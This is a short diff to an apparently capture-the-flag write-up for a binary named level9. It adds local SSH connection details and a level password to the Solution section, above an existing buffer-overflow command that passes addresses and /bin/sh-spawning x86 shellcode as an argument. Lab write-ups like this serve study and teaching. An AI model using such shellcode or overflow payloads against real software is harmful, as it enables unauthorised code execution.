@@ -567,6 +567,9 @@ This will be the payload for our binary.
 
 ### Solution
 
+Connect with `ssh -p 4243 level9@localhost`
+Enter the password `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
+
 We can execute the buffer overflow with this line.
 ```bash
 $ ./level9 $(printf "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80%83s\x0c\xa0\x04\x08" | tr ' ' 'a')
